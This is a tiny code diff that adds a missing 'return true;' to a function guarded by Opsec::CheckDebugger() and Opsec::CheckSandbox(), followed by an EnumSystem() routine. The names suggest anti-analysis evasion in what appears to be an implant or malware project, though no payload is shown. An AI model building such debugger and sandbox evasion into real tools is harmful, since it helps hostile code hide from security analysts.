@@ -73,6 +73,8 @@ namespace Main {
 		if (!Opsec::CheckDebugger() || !Opsec::CheckSandbox()) {
 			return false;
 		}
+
+		return true;
 	}
 
     BOOL EnumSystem() {
